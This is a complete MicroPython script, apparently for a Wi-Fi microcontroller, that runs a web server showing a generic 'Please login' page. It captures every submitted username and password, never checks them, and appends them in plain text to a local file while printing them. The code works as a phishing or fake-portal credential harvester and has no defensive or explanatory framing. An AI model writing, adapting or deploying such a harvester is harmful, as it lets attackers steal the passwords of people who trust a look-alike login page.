import network
import socket
import ure
import machine
import time

CREDENTIALS_FILE = "creds.txt"

def start_http_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 80))
    s.listen(5)
    print("HTTP server started on port 80")

    while True:
        conn, addr = s.accept()
        print('Got a connection from %s' % str(addr))

        request = conn.recv(1024).decode('utf-8')
        print('Content = %s' % request)

        if "POST" in request:
            match = ure.search(r"username=([^&]*)&password=([^&]*)", request)
            if match:
                username = match.group(1).replace("+", " ")
                password = match.group(2).replace("+", " ")
                save_credentials(username, password)

            response = b"HTTP/1.1 302 Found\r\nLocation: /\r\n\r\n"
            conn.send(response)
        else:
            response = web_page()
            conn.send(response)

        conn.close()

def web_page():
    return b"""HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
    <html>
    <head><title>Login</title></head>
    <body>
        <h2>Please login</h2>
        <form action="/" method="post">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """

def save_credentials(username, password):
    with open(CREDENTIALS_FILE, "a") as f:
        f.write(f"{username},{password}\n")
    print("Saved credentials:", username, password)
